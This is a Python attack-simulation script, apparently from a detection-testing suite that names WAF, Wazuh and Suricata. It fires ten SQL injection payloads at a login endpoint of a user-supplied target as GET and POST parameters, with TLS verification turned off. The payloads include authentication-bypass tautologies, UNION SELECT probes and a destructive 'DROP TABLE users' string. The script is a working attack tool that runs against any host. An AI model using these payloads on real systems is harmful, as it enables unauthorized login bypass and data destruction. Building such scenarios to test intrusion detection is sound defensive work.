#!/usr/bin/env python3
"""
Scenario 6: SQL Injection Attack
- Difficulty: Intermediate
- Detection: WAF, Wazuh, Suricata
- Expected Alert: SQL injection signature match, database anomaly
"""

import sys
import argparse
import logging
import requests
import time
from urllib.parse import urljoin

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SQLInjectionScenario:
    def __init__(self, target, endpoint='/api/login', verbose=False):
        self.target = target if target.startswith('http') else f"http://{target}"
        self.endpoint = endpoint
        self.verbose = verbose
        self.attempts = 0
        self.successful = 0
        self.results = {
            'scenario': 'SQL_INJECTION',
            'target': target,
            'endpoint': endpoint,
            'attempts': 0,
            'detections': 0,
            'status': 'pending'
        }

    def create_sql_payloads(self):
        """SQL injection payload variations"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' OR 'a'='a",
            "1' UNION SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "'; DROP TABLE users;--",
            "' OR 'x'='x",
            "admin' OR '1'='1",
            "' OR 'a'='a' --",
        ]
        return payloads

    def inject_sql(self):
        """Attempt SQL injection attacks"""
        logger.info(f"[*] Starting SQL Injection against {self.target}{self.endpoint}")

        payloads = self.create_sql_payloads()
        logger.info(f"[*] Total payloads to test: {len(payloads)}")

        start_time = time.time()

        try:
            for payload in payloads:
                self.attempts += 1

                # Try as GET parameter
                params = {
                    'username': payload,
                    'password': 'test'
                }

                # Try as POST data
                data = {
                    'username': payload,
                    'password': 'test'
                }

                try:
                    # GET request
                    logger.info(f"[+] Attempt {self.attempts}: Testing payload in GET")
                    response = requests.get(
                        urljoin(self.target, self.endpoint),
                        params=params,
                        timeout=5,
                        verify=False
                    )

                    if 'error' in response.text.lower() or response.status_code >= 500:
                        self.successful += 1
                        logger.warning(f"[!] Potential vulnerability detected: {payload}")

                    # POST request
                    logger.info(f"[+] Attempt {self.attempts}: Testing payload in POST")
                    response = requests.post(
                        urljoin(self.target, self.endpoint),
                        data=data,
                        timeout=5,
                        verify=False
                    )

                    if 'error' in response.text.lower() or response.status_code >= 500:
                        self.successful += 1
                        logger.warning(f"[!] Potential vulnerability detected: {payload}")

                    time.sleep(0.5)

                except requests.exceptions.RequestException as e:
                    if self.verbose:
                        logger.warning(f"[-] Request error: {e}")

        except KeyboardInterrupt:
            logger.info("\n[!] Injection attacks interrupted by user")
        except Exception as e:
            logger.error(f"[-] Attack failed: {e}")
            self.results['status'] = 'failed'
            return

        elapsed = time.time() - start_time
        self.results['attempts'] = self.attempts
        self.results['detections'] = self.successful
        self.results['duration'] = elapsed
        self.results['status'] = 'completed'
        self.log_results()

    def log_results(self):
        """Log injection results"""
        logger.info("\n" + "="*60)
        logger.info("SQL INJECTION RESULTS")
        logger.info("="*60)
        logger.info(f"Target: {self.target}{self.endpoint}")
        logger.info(f"Total Attempts: {self.attempts}")
        logger.info(f"Potential Vulnerabilities: {self.successful}")
        logger.info(f"Duration: {self.results.get('duration', 0):.2f}s")
        logger.info(f"Status: {self.results['status'].upper()}")
        logger.info("="*60)
        logger.info("\n[!] Check Monitoring Systems:")
        logger.info("  - WAF: Check SQL injection detection rules")
        logger.info("  - Wazuh: Search for 'SQL injection' alerts")
        logger.info("  - Suricata: Look for SQL keywords in payloads")
        logger.info("  - Application logs: Review failed login attempts")
        logger.info("="*60 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Attack Scenario',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python 06_sql_injection.py --target 10.10.10.10:8080 --endpoint /api/login
  python 06_sql_injection.py --target http://192.168.1.100 --verbose
        '''
    )

    parser.add_argument('--target', required=True, help='Target URL or IP:port')
    parser.add_argument('--endpoint', default='/api/login', help='Target endpoint')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')

    args = parser.parse_args()

    # Suppress SSL warnings
    requests.packages.urllib3.disable_warnings()

    scenario = SQLInjectionScenario(
        target=args.target,
        endpoint=args.endpoint,
        verbose=args.verbose
    )

    scenario.inject_sql()

if __name__ == '__main__':
    main()
